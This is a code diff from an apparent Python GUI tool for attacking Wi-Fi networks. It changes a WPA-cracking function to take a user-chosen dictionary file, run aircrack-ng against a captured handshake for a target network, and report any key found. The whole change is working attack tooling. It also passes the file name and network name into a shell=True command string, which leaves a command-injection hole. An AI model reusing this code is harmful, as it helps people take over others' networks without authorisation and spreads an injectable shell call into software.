@@ -6,6 +6,7 @@ import random as rd
 import time
 import re
 from tkinter import DISABLED, NORMAL
+from tkinter.filedialog import askopenfilename
 
 # some gui operations when attack is launched
 def attack_launched(tree, scan_btn, stop_attack_btn):
@@ -132,6 +133,13 @@ def crack_wpa(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right
         tools.addToolInfo(T, f"No captured handshake found for network {wifi_name}. Please capture a handshake first.\n\n")
         return 0
 
+    # get path of dictionary file
+    dict_filename = askopenfilename(title="Select a dictionary file for this attack", initialfile="passwords.lst", \
+                                    initialdir=cwd, filetypes=[("Dictionary files", "*.lst"), ("Text files", "*.txt")])
+
+    if dict_filename is None:
+        dict_filename = "passwords.lst"
+
     # now go
     attack_launched(tree, scan_btn, stop_attack_btn)
     
@@ -146,24 +154,30 @@ def crack_wpa(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right
     tools.addToolInfo(T, "Cracking password for network " + str(wifi_name) + "...\n\n")
 
     output_filename = f"crack_wpa_{wifi_name}.txt"
+
+    with open(output_filename, "w+") as f:
+        aircrack = subprocess.Popen([f"aircrack-ng -w {dict_filename} -b {mac} captured_{wifi_name}.cap"], shell=True, stdout=f, stderr=f)
+        aircrack.wait()
+
+        # pwd_found = False
+        # while not pwd_found:
     with open(output_filename, "r+") as f:
-        aircrack = subprocess.Popen([f"aircrack-ng -w passwords.lst -b {mac} captured_{wifi_name}.cap"], shell=True, stdout=f, stderr=f)
+        contents = f.readlines()
+        
+        for line in contents:
+            if "KEY FOUND" in line:
+                idx_left = line.index("!") + 3
+                idx_right = line.index("]")
+                tools.addToolInfo(T, "Password found: " + line[idx_left:idx_right] + "\n\n")
+                aircrack.terminate()
+                # pwd_found = True
 
-        pwd_found = False
-        while not pwd_found:
-            contents = f.readlines()
-            for line in contents:
-                if "KEY FOUND" in line:
-                    idx_left = line.index("!") + 3
-                    idx_right = line.index("]")
-                    tools.addToolInfo(T, "Password found: " + line[idx_left:idx_right] + "\n\n")
-                    aircrack.terminate()
-                    pwd_found = True
+                # break from the inner loop, so that we stop reading the file
+                break
+        else:
+            tools.addToolInfo(T, "Password not found :(\n\nTry again with another dictionary.\n\n")
 
-                    # break from the inner loop, so that we stop reading the file
-                    break
-
-            time.sleep(0.5)
+            # time.sleep(0.5)
 
     # delete the log file, no more needed
     os.remove(output_filename)
